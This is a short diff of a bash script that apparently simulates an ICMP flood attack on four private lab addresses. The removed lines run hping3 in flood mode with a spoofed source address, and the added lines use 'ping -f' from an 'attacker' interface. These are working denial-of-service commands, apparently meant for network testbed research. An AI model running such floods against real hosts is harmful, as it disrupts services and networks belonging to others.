@@ -1,20 +1,15 @@
 #!/bin/bash
-# attack_generator.sh - simulate ICMP flood jamming attack
 
-VICTIMS=("10.0.1.1" "10.0.1.2" "10.0.1.3" "10.0.1.4")
-ATTACKER_IP="10.0.1.100"
-DURATION=30  # seconds
+TARGETS=("10.0.1.1" "10.0.1.2" "10.0.1.3" "10.0.1.4")
 
-echo "Starting ICMP flood attack simulation..."
+echo "Starting ICMP flood attack simulation from attacker 10.0.1.100..."
 
-for ip in "${VICTIMS[@]}"
-do
-  echo "Flooding $ip from $ATTACKER_IP"
-  hping3 --icmp --flood -a $ATTACKER_IP $ip > /dev/null 2>&1 &
+for ip in "${TARGETS[@]}"; do
+    echo "Flooding $ip from 10.0.1.100"
+    # Flood ping: send continuous packets, fast (-f), count 50 packets
+    ping -f -c 50 -I attacker-wlan0 $ip &
 done
 
-sleep $DURATION
-
-killall hping3
+wait
 
 echo "Attack simulation finished."
